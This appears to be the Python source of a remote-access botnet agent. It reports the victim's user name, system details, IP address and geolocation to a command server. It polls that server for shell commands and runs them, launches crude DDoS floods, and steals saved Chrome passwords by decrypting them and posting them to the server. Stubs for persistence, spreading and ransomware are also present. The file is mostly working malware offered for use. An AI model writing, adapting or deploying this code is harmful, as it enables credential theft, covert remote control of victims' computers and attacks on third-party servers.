import platform
import requests
import json
import getpass
import Crypto
from Crypto.Hash import SHA512,MD5
from Crypto.Cipher import AES
import socket
import base64
import sqlite3
import threading
import os,sys

try:
    import win32crypt
except:
    pass

#Variables
HOST = 'http://127.0.0.1'
PORT = str(8080)
USER = getpass.getuser()
PROCESSOR = platform.machine()
OS = platform.system()
UNAME = str(platform.uname())
IP = requests.get("http://icanhazip.com").content.decode().split("\n")[0]
GEO = json.JSONDecoder().decode(requests.get("https://ip-api.io/json/"+IP).content.decode()).get("country_code")
COORDS = {'lat':json.JSONDecoder().decode(requests.get("https://ip-api.io/json/"+IP).content.decode()).get("latitude"), 
          'long':json.JSONDecoder().decode(requests.get("https://ip-api.io/json/"+IP).content.decode()).get("longitude") }
AUTO_PERSISTENCE = True
KEY = Crypto.Hash.MD5.new(Crypto.Hash.SHA512.new(USER.encode()).hexdigest().encode()).hexdigest() #len(KEY) = 16 or multiple
ENC = AES.new(KEY.encode(), AES.MODE_CBC)

#Modules
class Modules():
    
    def persistence(self):
        
        return 0
    
    def ddos(self, server):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            r = s.connect_ex((server.split(':')[0], int(server.split(':')[1])))
            if not r:
                for x in range(10):
                    s.send(b"GET /"+ server+b" HTTP/1.1\r\n")  
                    s.send(b"Host: "+server+b" HTTP1.1\r\n")
                    s.send(b'DDOS: '+b"www"*x+b" HTTP1.1\r\n") #The weight of the packets is very important
                    s.close()  
        except Exception as e:
            print("Error: {0}".format(str(e))) #In TEST
            pass 
        return 0
    
    def spread(self):
        return 0
    
    def cred(self):
        info_list = []
        path = self.getpath()
        try:
            connection = sqlite3.connect(path + "Login Data")
            with connection:
                cursor = connection.cursor()
                v = cursor.execute('SELECT action_url, username_value, password_value FROM logins')
                value = v.fetchall()
    
            for information in value:
                if os.name == 'nt':
                    password = win32crypt.CryptUnprotectData(
                        information[2], None, None, None, 0)[1]
                    if password:
                        info_list.append({
                            'origin_url': information[0],
                            'username': information[1],
                            'password': str(password.decode())
                        })
    
                elif os.name == 'posix':
                    info_list.append({
                        'origin_url': information[0],
                        'username': information[1],
                        'password': information[2].decode()
                    })
    
        except sqlite3.OperationalError as e:
            info_list = {
                'username': 'Error',
                'password': str(e),
                'origin_url': IP
            } 
        
        for x in info_list:
            requests.post(HOST+":"+PORT+"/insert_creds/", json={'KEY':KEY, 'USER':x['username'], 'PASS':x['password'], 'URL':x['origin_url']})
        return 0


    def getpath(self):
        if os.name == "nt":
            # This is the Windows Path
            PathName = os.getenv('localappdata') + '\\Google\\Chrome\\User Data\\Default\\'
            if (os.path.isdir(PathName) == False):
                pass
        elif ((os.name == "posix") and (sys.platform == "darwin")):
            # This is the OS X Path
            PathName = os.getenv('HOME') + "/Library/Application Support/Google/Chrome/Default/"
            if (os.path.isdir(PathName) == False):
                pass
        elif (os.name == "posix"):
            # This is the Linux Path
            PathName = os.getenv('HOME') + '/.config/google-chrome/Default/'
            if (os.path.isdir(PathName) == False):
                pass
        return PathName
    
    def ransom(self):
        return 0
    
    def exe(self, cmd):
        return str(platform.popen(cmd).read())       
        


MODS = Modules()

#Agent
class Core():
    
    def __init__(self):
        '''Initialize the agent with the first request'''
        if requests.head(HOST+":"+PORT).ok == True: #test if respond [head has not response body]
            requests.post(HOST+":"+PORT+"/welcome/", json={'USER':USER, 'UNAME':UNAME, 'GEO':GEO, 
                                              'IP':IP, 'LAT':COORDS.get('lat'), 
                                              'LONG':COORDS.get('long'), 'OS':OS}) #when it arrive to destination, the KEY will be calculated: BASE64(SHA512(_USER))
        if AUTO_PERSISTENCE == True:
            MODS.persistence()
        
        self.receiver()
        
    def receiver(self):
        '''Check every 30 seconds if there is commands to execute'''
        threading.Timer(30.0, self.receiver).start()
        cmd = requests.get(HOST+":"+PORT+"/check_cmd/"+KEY+"/").content.decode() 
        cmd = cmd.split("<br>")[0].replace("\n","")
        
        if cmd == 'quit':
            platform.popen("shutdown -t 100 'Error Occurred .  .  .  .  .  .  .  .  .  .  ..  .  .  .  .  .  .  .  .  .  ..  .  .  .  .  .  .  .  .  .  .'")
            pass
            
        elif "ddos" in cmd:
            for x in range(1, threading.active_count()):
                t = threading.Thread(target=MODS.ddos(cmd.split("ddos ")[1])) #cmd = 'ddos www.google.it:443'
                t.start()
                print("Strarted: {0}".format(str(t)))
            requests.post(HOST+":"+PORT+"/cmd_out/", json={'KEY':KEY, 'OUT':'Dossed {0}'.format(cmd.split("ddos ")[1]) ,'IN':cmd})
            pass
            
        elif cmd == 'cred':
            MODS.cred()
            pass
            
        elif cmd == 'ransom':
            MODS.ransom()
            pass
            
        else:
            requests.post(HOST+":"+PORT+"/cmd_out/", json={'KEY':KEY,'OUT':MODS.exe(cmd), 'IN':cmd})
            pass
            

agent = Core()
